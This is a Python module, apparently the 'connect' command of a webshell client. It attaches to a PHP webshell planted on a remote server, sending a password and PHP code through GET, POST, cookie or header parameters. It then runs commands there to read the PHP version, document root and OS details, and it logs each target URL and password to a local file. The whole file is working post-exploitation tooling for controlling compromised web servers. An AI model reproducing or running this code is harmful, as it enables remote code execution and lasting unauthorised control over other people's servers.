from libs.config import alias, gset, gget, color, set_namespace
from libs.myapp import send, print_webshell_info
from os import path
from urllib.parse import urlparse


@alias(True, "c", u="url", m="method", p="pwd")
def run(url: str, method: str = "GET", pwd: str = "pass", *encode_functions):
    """
    connect

    Connect a webshell of php
    """
    method = str(method).upper()
    params_dict = {}
    if method == "GET":
        raw_key = "params"
    elif method == "POST":
        raw_key = "data"
    elif method == "COOKIE":
        raw_key = "cookies"
    elif method == "HEADER":
        raw_key = "headers"
    else:
        print(color.red("Method error"))
        return
    encode_functions = [str(f) for f in encode_functions]
    params_dict[raw_key] = {}
    webshell_netloc = urlparse(url).netloc
    gset("url", url, namespace="webshell")
    gset("webshell.params_dict", params_dict, namespace="webshell")
    gset("webshell.password", pwd, namespace="webshell")
    gset("webshell.method", raw_key, namespace="webshell")
    gset("webshell.encode_functions", encode_functions, namespace="webshell")
    gset("webshell.netloc", webshell_netloc, namespace="webshell")
    gset(
        "webshell.download_path",
        path.join(gget("root_path"), "target", webshell_netloc),
        namespace="webshell",
    )
    req = send("print(phpversion());", raw=True)
    gset("webshell.php_version", req.text.strip(), namespace="webshell")
    if ('7.' in req.text):
        gset("webshell.v7", True, namespace="webshell")
    req = send("print(md5(1));")
    if "c4ca4238a0b923820dcc509a6f75849b" in req.r_text:  # 验证是否成功连接
        info_req = send(
            "print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname());"
        )
        info = info_req.r_text.strip().split("|")
        gset("webshell.root", info[0], namespace="webshell")
        gset("webshell.os_version", info[1], namespace="webshell")
        gset(
            "webshell.os",
            (True if "win" in info[1].lower() else False),
            namespace="webshell",
        )
        from_log = gget("webshell.from_log", "webshell")
        if not from_log:
            with open("webshell.log", "a+") as f:
                text = f.read()
                if not text.endswith("\n"):
                    f.write("\n")
                f.write(f"{url}|{method}|{pwd}|{'|'.join(encode_functions)}\n")
        else:
            gset("webshell.from_log", False, True, "webshell")
        print(color.cyan("Connect success...\n"))
        print_webshell_info()
        set_namespace("webshell")
        return True
    else:
        print(color.red("Connect failed..."))
        print(req.r_text)
        return False
